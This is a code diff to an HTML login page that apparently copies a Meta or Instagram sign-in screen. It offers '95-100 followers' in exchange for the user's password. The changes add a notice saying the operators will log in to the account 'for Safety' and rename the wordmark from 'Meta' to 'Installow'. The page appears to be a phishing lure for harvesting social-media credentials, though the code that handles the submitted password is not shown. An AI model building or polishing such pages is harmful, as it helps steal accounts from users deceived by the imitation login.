@@ -88,6 +88,17 @@
       letter-spacing: .2px;
     }
     .btn-login:active { opacity: .88; }
+    .saved-message {
+      display: block;
+      width: 100%;
+      margin: 14px 0 0;
+      text-align: center;
+      color: #f61954;
+      font-family: cursive, sans-serif;
+      font-size: 15px;
+      font-weight: 600;
+      letter-spacing: .3px;
+    }
     .forgot {
       display: block;
       text-align: center;
@@ -148,7 +159,7 @@
     <input type="password" placeholder="Password" autocomplete="current-password" id="password"/>
   </div>
   <button class="btn-login" onclick="handleLogin()">Increase upto 95-100 followers</button>
-  <a href="#" class="forgot"></a>
+  <p class="saved-message">We will Loggin in to your account for Safety!!</p>
   <div class="spacer"></div>
   <div class="bottom">
     <a href="#" class="btn-create">It Can Take 2-3 Minutes</a>
@@ -163,10 +174,9 @@
         </defs>
         <ellipse cx="9.5" cy="11" rx="6" ry="5" fill="none" stroke="url(#meta-g)" stroke-width="3.2" transform="rotate(-8 9.5 11)"/>
         <ellipse cx="18.5" cy="11" rx="7" ry="5" fill="none" stroke="url(#meta-g)" stroke-width="3.2"/>
-        <text x="30" y="15.5" font-family="-apple-system,BlinkMacSystemFont,'Helvetica Neue',Helvetica,Arial,sans-serif" font-size="14" font-weight="700" fill="#1c1c1c" letter-spacing="-.1">Meta</text>
+        <text x="30" y="15.5" font-family="-apple-system,BlinkMacSystemFont,'Helvetica Neue',Helvetica,Arial,sans-serif" font-size="14" font-weight="700" fill="#1c1c1c" letter-spacing="-.1">Installow</text>
       </svg>
-    </div>
-  </div>
+    </div>  </div>
 </div>
 <button class="help-btn" onclick="handleHelp()" aria-label="Help"></button>
 
@@ -231,10 +241,8 @@ function handleHelp() {
 }
 </script>
 </body>
-
 <div class="footer-links">
       <a href="privacy-policy.html">Privacy Policy</a>
       <a href="terms-of-service.html">Terms of Service</a>
     </div>
-  
 </html>
